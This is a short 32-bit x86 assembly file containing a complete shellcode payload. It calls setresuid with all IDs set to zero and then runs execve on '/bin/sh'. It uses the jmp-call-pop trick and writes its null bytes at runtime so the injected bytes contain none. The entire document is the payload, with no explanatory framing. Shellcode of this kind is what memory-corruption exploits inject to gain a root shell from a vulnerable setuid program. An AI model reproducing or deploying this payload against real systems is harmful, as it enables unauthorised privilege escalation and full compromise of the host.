BITS 32

jmp short last

shell:
	; setresuid(uid_t ruid, uid_t euid, uid_t suid);
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	mov al, 164
	int 0x80
	; execve(const char *filename, char *const argv[], char *const env)
	pop ebx
	xor eax, eax
	mov [ebx+7], al
	mov [ebx+8], ebx
	mov [ebx+12], eax
	lea ecx, [ebx+8]
	lea edx, [ebx+12]
	mov al, 11
	int 0x80

last:
	call shell
	db '/bin/sh'
